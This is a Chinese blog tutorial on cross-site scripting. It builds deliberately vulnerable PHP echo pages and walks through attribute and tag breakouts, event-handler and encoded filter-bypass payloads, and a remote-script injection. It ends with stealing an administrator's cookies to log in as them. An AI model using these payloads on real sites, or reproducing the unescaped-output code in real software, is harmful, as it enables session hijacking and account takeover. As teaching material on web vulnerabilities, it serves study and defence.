---
title: XSS 的原理分析与解剖
description: XSS 原理分析第一章
date: 2016-05-30T11:27:07+08:00
tags:
  - web security
  - xss
translationKey: principle-analysis-and-anatomy-of-xss
aliases:
  - /zh/2016/05/30/principle-analysis-and-anatomy-of-xss/
  - /zh/p/principle-analysis-and-anatomy-of-xss/
  - /zh/posts/xss的原理分析与解剖/
---

## 0×01 前言: {#intro}

《xss 攻击手法》一开始在互联网上资料并不多 (都是现成的代码，没有从基础的开始)，直到刺的《白帽子讲 WEB 安全》和 cn4rry 的《XSS 跨站脚本攻击剖析与防御》才开始好转。

我这里就不说什么 xss 的历史什么东西了，xss 是一门又热门又不太受重视的 Web 攻击手法，为什么会这样呢，原因有下:

1. 耗时间
2. 有一定几率不成功
3. 没有相应的软件来完成自动化攻击
4. 前期需要基本的 html、js 功底，后期需要扎实的 html、js、actionscript2/3.0 等语言的功底
5. 是一种被动的攻击手法
6. 对 website 有 http-only、crossdomian.xml 没有用

但是这些并没有影响黑客对此漏洞的偏爱，原因不需要多，只需要一个“XSS 几乎每个网站都存在，google、baidu、360 等都存在。”

## 0x02 原理: {#how-it-works}

首先我们现在本地搭建个 PHP 环境 (可以使用 phpstudy 安装包安装)，然后在 index.php 文件里写入如下代码:

```html
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>XSS原理重现</title>
    </head>
    <body>
        <form action="" method="get">
            <input type="text" name="xss_input">
            <input type="submit">
        </form>
        <hr>
        <?php
        $xss = $_GET['xss_input'];
        echo '你输入的字符为<br>'.$xss;
        ?>
    </body>
</html>
```

然后，你会在页面看到这样的页面

![](/images/principle-analysis-and-anatomy-of-xss/echo-form-empty.png)

我们试着输入 abcd123，得到的结果为

![](/images/principle-analysis-and-anatomy-of-xss/echo-abcd123.png)

我们在看看源代码

![](/images/principle-analysis-and-anatomy-of-xss/source-echo-abcd123.png)

我们输入的字符串被原封不动的输出来了，那这里我们提出来一个假设，假设我们在搜索框输入 `<script>alert('xss')</script>` 会出现什么呢？如果按照上面的例子来说，它应该存在第 12 行的 `<br>` 与 `</boby>` 之间，变成 `<br><script>alert('xss')</script></boby>`，那应该会弹出对话框。

既然假设提出来，那我们来实现下这个假设成不成立吧。

我们输入 `<script>alert('xss')</script>`，得到的页面为

![](/images/principle-analysis-and-anatomy-of-xss/script-alert-popup.png)

成功弹窗，这个时候基本上就可以确定存在 xss 漏洞。

我们在看看源代码

![](/images/principle-analysis-and-anatomy-of-xss/source-script-in-body.png)

看来，我们的假设成功了，这节就说说 XSS 的原理，下面几节说说 xss 的构造和利用

## 0×03 xss 利用输出的环境来构造代码: {#output-context}

上节说了 xss 的原理，但是我们的输出点不一在 `<br>` 和 `</boby>` 里，可以出现在 html 标签的属性里，或者其他标签里面。所以这节很重要，因为不一定 当你输入

`<script>alert('xss')</script>` 就会弹窗。

先贴出代码:

```html
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>XSS利用输出的环境来构造代码</title>
    </head>
    <body>
        <center>
            <h6>把我们输入的字符串 输出到input里的value属性里</h6>
            <form action="" method="get">
                <h6>请输入你想显现的字符串</h6>
                <input type="text" name="xss_input_value" value="输入"><br>
                <input type="submit">
            </form>
            <hr>
            <?php
            $xss = $_GET['xss_input_value'];
            if(isset($xss)){
                echo '<input type="text" value="'.$xss.'">';
            }else{
                echo '<input type="type" value="输出">';
            }
            ?>
        </center>
    </body>
</html>
```

下面是代码的页面

![](/images/principle-analysis-and-anatomy-of-xss/value-attr-form.png)

这段代码的作用是把第一个输入框的字符串，输出到第二个输入框，我们输入 1，那么第二个 input 里的 value 值就是 1，下面是页面的截图和源代码的截图 (这里我输入 `<script>alert('xss')</script>` 来测试)

![](/images/principle-analysis-and-anatomy-of-xss/value-attr-script-typed.png)

![](/images/principle-analysis-and-anatomy-of-xss/value-attr-no-popup.png)

明显的可以看到，并没有弹出对话框，大家可能会疑惑为什么没有弹窗呢，我们来看看源代码

![](/images/principle-analysis-and-anatomy-of-xss/source-script-in-value.png)

我们看到我们输入的字符串被输出到第 15 行 input 标签里的 value 属性里面，被当成 value 里的值来显现出来，所以并没有弹窗，这时候我们该怎么办呢？聪明的人已经发现了可以在 `<script>alert('xss')</script>` 前面加个`">`来闭合 input 标签。所以应该得到的结果为

![](/images/principle-analysis-and-anatomy-of-xss/quote-breakout-popup.png)

成功弹窗了，我们在看看这时的页面

![](/images/principle-analysis-and-anatomy-of-xss/quote-breakout-leftover.png)

看到后面有第二个 input 输入框后面跟有">字符串，为什么会这样呢，我们来看看源代码

![](/images/principle-analysis-and-anatomy-of-xss/source-quote-breakout.png)

这时可以看到我们构造的代码里面有两个`">`，第一个">是为了闭合 input 标签，所以第二个`">`就被抛弃了，因为 html 的容错性高，所以并没有像 php 那样出现错误，而是直接把多余的字符串来输出了，有的人是个完美主义者，不喜欢有多余的字符串被输出，这时该怎么办呢？

这里我问大家一个问题，我之前说的 xss 代码里，为什么全是带有标签的。难道就不能不带标签么？！答: 当然可以。既然可以不用标签，那我们就用标签里的属性来构造 XSS，这样的话，xss 代码又少，又不会有多余的字符串被输出来。

还是这个环境，但是不能使用标签，你应该怎么做。想想 input 里有什么属性可以调用 js，html 学的好的人，应该知道了，on 事件，对的。我们可以用 on 事件来进行弹窗，比如这个 xss 代码 我们可以写成 `" onclick="alert('xss')`

这时，我们在来试试，页面会发生什么样的变化吧。

![](/images/principle-analysis-and-anatomy-of-xss/onclick-attr-typed.png)

没有看到弹窗啊，失败了么？答案当然是错误的，因为 onclick 是鼠标点击事件，也就是说当你的鼠标点击第二个 input 输入框的时候，就会触发 onclick 事件，然后执行 `alert('xss')` 代码。我们来试试看

![](/images/principle-analysis-and-anatomy-of-xss/onclick-alert-popup.png)

当我点击后，就出现了弹窗，这时我们来看看源代码把

![](/images/principle-analysis-and-anatomy-of-xss/source-onclick-attr.png)

第 15 行，value 值为空，当鼠标点击时，就会弹出对话框。这里可能就会有人问了，如果要点击才会触发，那不是很麻烦么，成功率不就又下降了么。我来帮你解答这个问题，on 事件不止 onclick 这一个，还有很多，如果你想不需要用户完成什么动作就可以触发的话，i 可以把 onclick 改成

- onmousemove 当鼠标移动就触发

- onload 当页面加载完成后触发

还有很多，我这里就不一一说明了，有兴趣的朋友可以自行查询下。

别以为就这样结束了，还有一类环境不能用上述的方法，

那就是如果在 `<textarea>` 标签里呢？！或者其他优先级比 script 高的呢？

就下面这样

![](/images/principle-analysis-and-anatomy-of-xss/textarea-context.png)

这时我们该怎么办呢？既然前面都说了闭合属性和闭合标签了，那能不能闭合完整的标签呢，答案是肯定的。我们可以输入 `</textarea><script>alert('xss')</script>` 就可以实现弹窗了。

## 0×04 过滤的解决办法: {#bypass-filter}

假如说网站禁止过滤了 script 这时该怎么办呢，记住一句话，这是我总结出来的“xss 就是在页面执行你想要的 js”不用管那么多，只要能运行我们的 js 就 OK，比如用 img 标签或者 a 标签。我们可以这样写

```html
<img scr=1 onerror=alert('xss')> 当找不到图片名为1的文件时，执行alert('xss')
<a href=javascrip:alert('xss')>s</a> 点击s时运行alert('xss')
<iframe src=javascript:alert('xss');height=0 width=0 /><iframe> 利用iframe的scr来弹窗
<img src="1" onerror=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")></img> 过滤了alert来执行弹窗
```

等等有很多的方法，不要把思想总局限于一种上面，记住一句话“xss 就是在页面执行你想要的 js”其他的管他去。(当然有的时候还要管他…)

## 0×05 xss 的利用: {#exploitation}

说了那么多，大家可能都以为 xss 就是弹窗，其实错了，弹窗只是测试 xss 的存在性和使用性。

这时我们要插入 js 代码了，怎么插呢？

你可以这样

```html
<script scr="js_url"></script>
```

也可以这样

```html
<img src=x onerror=appendChild(createElement('script')).src='js_url' />
```

各种姿势，各种插，只要鞥运行我们的 js 就 OK。那运行我们的 js 有什么用呢？

Js 可以干很多的事，可以获取 cookies(对 http-only 没用)、控制用户的动作 (发帖、私信什么的) 等等。

比如我们在网站的留言区输入 `<script scr="js_url"></script>` 当管理员进后台浏览留言的时候，就会触发，然后管理员的 cookies 和后台地址还有管理员浏览器版本等等你都可以获取到了，再用“桂林老兵 cookie 欺骗工具”来更改你的 cookies，就可以不用输入账号 密码 验证码 就可以以管理员的方式来进行登录了。

至于不会 js 的怎么写 js 代码呢，放心网上有很多 xss 平台，百度一下就可以看到了。页面是傻瓜式的操作，这里就不再过多的说明了。
